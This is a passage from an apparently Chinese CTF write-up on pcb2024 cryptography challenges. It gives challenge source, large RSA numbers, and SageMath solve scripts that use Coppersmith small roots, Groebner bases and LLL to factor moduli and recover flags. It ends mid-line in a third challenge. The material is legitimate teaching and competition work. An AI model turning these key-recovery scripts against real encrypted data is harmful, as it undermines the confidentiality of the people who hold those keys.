xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo>=</mo><mi>m</mi><mo>+</mo><msub><mi>k</mi><mn>2</mn></msub><mi>q</mi></mrow><annotation encoding="application/x-tex">c2[1]=m+k_{2}q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>:</mo><mtext> </mtext><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo>∗</mo><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo>=</mo><msup><mi>m</mi><mn>2</mn></msup><mo>+</mo><mo stretchy="false">(</mo><msub><mi>k</mi><mn>1</mn></msub><mi>p</mi><mo>+</mo><msub><mi>k</mi><mn>2</mn></msub><mi>q</mi><mo stretchy="false">)</mo><mo>∗</mo><mi>m</mi><mo>+</mo><msub><mi>k</mi><mn>1</mn></msub><mi>p</mi><mo>∗</mo><mi>k</mi><msub><mn>2</mn><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">1:\ c2[0]*c2[1]=m^{2}+(k_{1}p+k_{2}q)*m+k_{1}p*k2_{q}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.980548em;vertical-align:-0.286108em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo>:</mo><mtext> </mtext><mi>m</mi><mo>∗</mo><mo stretchy="false">(</mo><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo>+</mo><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">)</mo><mo>=</mo><mn>2</mn><mo>∗</mo><msup><mi>m</mi><mn>2</mn></msup><mo>+</mo><mo stretchy="false">(</mo><msub><mi>k</mi><mn>1</mn></msub><mi>p</mi><mo>+</mo><msub><mi>k</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>∗</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">2:\ m*(c2[0]+c2[1])=2*m^{2}+(k_{1}p+k_{2})*m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>m</mi><mn>2</mn></msup><mo>−</mo><mi>m</mi><mo>∗</mo><mo stretchy="false">(</mo><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo>+</mo><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">)</mo><mo>+</mo><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo>∗</mo><mi>c</mi><mn>2</mn><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo>≡</mo><mn>0</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">m^{2}-m*(c2[0]+c2[1])+c2[0]*c2[1]\equiv 0(mod\ n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">P,Q = [<span class="number">12053085469218650692076937068797478047679005585690696222988148891925249697123080938461512785257424651119325211991331622346111396522606463631848519999574540677285771456451798811902760319940781754940936484802949729402283626052963389539032949160905330315285409948932070460455535716223838438994608837585387741418172014634472651248450564788332400265295308803291229281839428962457585593065595521459963501453576128172245723315811398209056633738967993602668795794847967331946516181453804430961308142497659799416125763566765485760600358126127595222197324155943818136202233758771243043559460620477085689770403810190118485243364</span>, <span class="number">13878717704635179949812987989626985689079485417345626168168664941124566737996226347895779823781042724620099437593856913505609774929187720381745418166924229828643565384137488017127800518133460531729559408120123922005898834268035918798610962941606864727966963354615441094676621013036726097763695675723672289505864372820096404707522755617527884121630784469379311199256277022770033036782130954108210409787680433301426480762532000133464370267551845990395683108170721952672388388178378604502610341465223041534665133155077544973384500983410220955683686526835733853985930134970899200234404716865462481142496209914197674463932</span>]</span><br><span class="line">n = <span class="number">16175064088648626038689748434699435826247716579187475966092822028609536761351820951820375552440329596553448265674841223230257463367834546091974959931391707199002842774795702094681528411058318007858638798643010942408552063479863545047616823056802010158288409527763686086960916160949496083789920012040215745627854092010308869223489833074860062054019221397227691063339148923860987250696934050122115972982286012688955816234717242567815830341836031567275888691320640526306946586793028267588302696611724356566003447616419092371914903382944112125852939011729294400479171568234647164730191643282793224422368321464125847020067</span></span><br><span class="line"></span><br><span class="line">PR.&lt;m&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = m^<span class="number">2</span> - (P+Q)*m + P*Q</span><br><span class="line">x0 = f.small_roots()</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(x0[<span class="number">0</span>])).decode())</span><br><span class="line"><span class="comment"># d2-bbe5-1420eaaa3b30&#125;</span></span><br></pre></td></tr></table></figure><h3 id="ezrsa-pcb2024"><a class="markdownIt-Anchor" href="#ezrsa-pcb2024"></a> ezrsa-pcb2024</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad_flag</span>(<span class="params">flag, bits=<span class="number">1024</span></span>):</span><br><span class="line">    pad = os.urandom(bits//<span class="number">8</span> - <span class="built_in">len</span>(flag))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(flag + pad, <span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line">p,q = [getPrime(<span class="number">1024</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;RSA&quot;</span>[<span class="number">1</span>:]] </span><br><span class="line">a,b = [randint(<span class="number">0</span>, <span class="number">2</span>**<span class="number">1024</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;RSA&quot;</span>[:-<span class="number">1</span>]] </span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">m = pad_flag(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> m &lt; n</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(p + b * q)</span><br><span class="line"><span class="built_in">print</span>(a * p + q)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 11850797596095451670524864488046085367812828367468720385501401042627802035427938560866042101544712923470757782908521283827297125349504897418356898752774318846698532487439368216818306352553082800908866174488983776084101115047054799618258909847935672497139557595959270012943240666681053544905262111921321629682394432293381001209674417203517322559283298774214341100975920287314509947562597521988516473281739331823626676843441511662000240327706777269733836703945274332346982187104319993337626265180132608256601473051048047584429295402047392826197446200263357260338332947498385907066370674323324146485465822881995994908925</span></span><br><span class="line"><span class="comment"># 21318014445451076173373282785176305352774631352746325570797607376133429388430074045541507180590869533728841479322829078527002230672051057531691634445544608584952008820389785877589775003311007782211153558201413379523215950193011250189319461422835303446888969202767656215090179505169679429932715040614611462819788222032915253996376941436179412296039698843901058781175173984980266474602529294294210502556931214075073722598225683528873417278644194278806584861250188304944748756498325965302770207316134309941501186831407953950259399116931502886169434888276069750811498361059787371599929532460624327554481179566565183721777</span></span><br><span class="line"><span class="comment"># 4780454330598494796755521994676122817049316484524449315904838558624282970709853419493322324981097593808974378840031638879097938241801612033487018497098140216369858849215655128326752931937595077084912993941304190099338282258345677248403566469008681644014648936628917169410836177868780315684341713654307395687505633335014603359767330561537038768638735748918661640474253502491969012573691915259958624247097465484616897537609020908205710563729989781151998857899164730749018285034659826333237729626543828084565456402192248651439973664388584573568717209037035304656129544659938260424175198672402598017357232325892636389317</span></span><br><span class="line"><span class="comment"># 9819969459625593669601382899520076842920503183309309803192703938113310555315820609668682700395783456748733586303741807720797250273398269491111457242928322099763695038354042594669354762377904219084248848357721789542296806917415858628166620939519882488036571575584114090978113723733730014540463867922496336721404035184980539976055043268531950537390688608145163366927155216880223837210005451630289274909202545128326823263729300705064272989684160839861214962848466991460734691634724996390718260697593087126527364129385260181297994656537605275019190025309958225118922301122440260517901900886521746387796688737094737637604</span></span><br></pre></td></tr></table></figure><p>懂的都懂，原题，上周的强网杯也上了，<a href="https://dexterjie.github.io/2024/11/04/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/">apbq</a>，<a href="https://github.com/defund/ctf/blob/master/angstromctf-2024/blahaj/solve.sage">脚本</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c=<span class="number">11850797596095451670524864488046085367812828367468720385501401042627802035427938560866042101544712923470757782908521283827297125349504897418356898752774318846698532487439368216818306352553082800908866174488983776084101115047054799618258909847935672497139557595959270012943240666681053544905262111921321629682394432293381001209674417203517322559283298774214341100975920287314509947562597521988516473281739331823626676843441511662000240327706777269733836703945274332346982187104319993337626265180132608256601473051048047584429295402047392826197446200263357260338332947498385907066370674323324146485465822881995994908925</span></span><br><span class="line">n=<span class="number">21318014445451076173373282785176305352774631352746325570797607376133429388430074045541507180590869533728841479322829078527002230672051057531691634445544608584952008820389785877589775003311007782211153558201413379523215950193011250189319461422835303446888969202767656215090179505169679429932715040614611462819788222032915253996376941436179412296039698843901058781175173984980266474602529294294210502556931214075073722598225683528873417278644194278806584861250188304944748756498325965302770207316134309941501186831407953950259399116931502886169434888276069750811498361059787371599929532460624327554481179566565183721777</span></span><br><span class="line">y=<span class="number">4780454330598494796755521994676122817049316484524449315904838558624282970709853419493322324981097593808974378840031638879097938241801612033487018497098140216369858849215655128326752931937595077084912993941304190099338282258345677248403566469008681644014648936628917169410836177868780315684341713654307395687505633335014603359767330561537038768638735748918661640474253502491969012573691915259958624247097465484616897537609020908205710563729989781151998857899164730749018285034659826333237729626543828084565456402192248651439973664388584573568717209037035304656129544659938260424175198672402598017357232325892636389317</span></span><br><span class="line">x=<span class="number">9819969459625593669601382899520076842920503183309309803192703938113310555315820609668682700395783456748733586303741807720797250273398269491111457242928322099763695038354042594669354762377904219084248848357721789542296806917415858628166620939519882488036571575584114090978113723733730014540463867922496336721404035184980539976055043268531950537390688608145163366927155216880223837210005451630289274909202545128326823263729300705064272989684160839861214962848466991460734691634724996390718260697593087126527364129385260181297994656537605275019190025309958225118922301122440260517901900886521746387796688737094737637604</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">R = Integers(n)</span><br><span class="line"></span><br><span class="line">P.&lt;a, b, p, q&gt; = PolynomialRing(Integers(n))</span><br><span class="line"></span><br><span class="line">f1 = a*p + q</span><br><span class="line"></span><br><span class="line">f2 = p + b*q</span><br><span class="line"></span><br><span class="line">f3 = p*q</span><br><span class="line"></span><br><span class="line">I = Ideal([f1 - x, f2 - y, f3 - n])</span><br><span class="line">B = I.groebner_basis()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">g = B[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">z = ZZ(g.coefficient(&#123;q: <span class="number">1</span>&#125;))</span><br><span class="line"><span class="keyword">assert</span> g.constant_coefficient() == R(-y)</span><br><span class="line"></span><br><span class="line">_, (z1, _), (z2, _) = <span class="built_in">list</span>(g)</span><br><span class="line">z1 = ZZ(z1)</span><br><span class="line">z2 = ZZ(z2)</span><br><span class="line"></span><br><span class="line">S = <span class="number">2</span>^<span class="number">1024</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p_upper_bits <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    p_upper = p_upper_bits &lt;&lt; <span class="number">1020</span></span><br><span class="line">    <span class="keyword">for</span> q_upper_bits <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        q_upper = q_upper_bits &lt;&lt; <span class="number">1020</span></span><br><span class="line">        M = matrix(ZZ, [[S, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>], [S*z1, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>], [S*(z2 + p_upper + q_upper*z1), <span class="number">0</span>, <span class="number">0</span>, S], [S*n, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]])</span><br><span class="line">        B = M.LLL()</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> B:</span><br><span class="line">            <span class="keyword">if</span> b[-<span class="number">1</span>] == S:</span><br><span class="line">                <span class="keyword">if</span> b[<span class="number">1</span>] &lt; <span class="number">0</span>:</span><br><span class="line">                    b *= -<span class="number">1</span></span><br><span class="line">                p_guess = b[<span class="number">1</span>] + p_upper</span><br><span class="line">                q_guess = b[<span class="number">2</span>] + q_upper</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> p_guess * q_guess == n:</span><br><span class="line">                    d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, (p_guess - <span class="number">1</span>)*(q_guess - <span class="number">1</span>))</span><br><span class="line">                    message = long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(c, d, n)))</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> message:</span><br><span class="line">                        <span class="built_in">print</span>(message)</span><br><span class="line">                        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>奇怪的是，这个<a href="https://connor-mccartney.github.io/cryptography/rsa/BLAHAJ-angstrom-CTF-2024">脚本</a>好像打不出来，上周强网杯是可以的</p><h3 id="alicessecret-pcb2024after-game"><a class="markdownIt-Anchor" href="#alicessecret-pcb2024after-game"></a> Alice’sSecret-pcb2024(after game)</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> iv, KEY</span><br><span class="line"></span><br><span class="line"><span class="comment"># I think you will definitely be interested in the content in PNG!</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">=======================================================================================</span></span><br><span class="line"><span class="string">     _      _   _                 _           ____                                _   </span></span><br><span class="line"><span class="string">    / \    | | (_)   ___    ___  ( )  ___    / ___|    ___    ___   _ __    ___  | |_ </span></span><br><span class="line"><span class="string">   / _ \   | | | |  / __|  / _ \ |/  / __|   \___ \   / _ \  / __| | &#x27;__|  / _ \ | __|</span></span><br><span class="line"><span class="string">  / ___ \  | | | | | (__  |  __/     \__ \    ___) | |  __/ | (__  | |    |  __/ | |_ </span></span><br><span class="line"><span class="string"> /_/   \_\ |_| |_|  \___|  \___|     |___/   |____/   \___|  \___| |_|     \___|  \__|</span></span><br><span class="line"><span class="string">                                                                                      </span></span><br><span class="line"><span class="string">=======================================================================================</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">return</span> m + (<span class="number">16</span> - (<span class="built_in">len</span>(m) % <span class="number">16</span>)) * <span class="string">b&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pngdata</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;picture.png&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        png_data = f.read()</span><br><span class="line">    <span class="keyword">return</span> pad(png_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_Key</span>(<span class="params">bits</span>):</span><br><span class="line">    p = getPrime(bits)</span><br><span class="line">    g = getPrime(bits // <span class="number">2</span>)</span><br><span class="line">    d = random.randint(<span class="number">1</span>, p - <span class="number">2</span>)</span><br><span class="line">    y = <span class="built_in">pow</span>(g, d, p)</span><br><span class="line">    public, private = (p, g, y), d</span><br><span class="line">    <span class="keyword">return</span> public, private</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Signature</span>(<span class="params">m, public, private</span>):</span><br><span class="line">    m = bytes_to_long(m)</span><br><span class="line">    p, g, _ = public</span><br><span class="line">    d = private</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        k = random.randint(<span 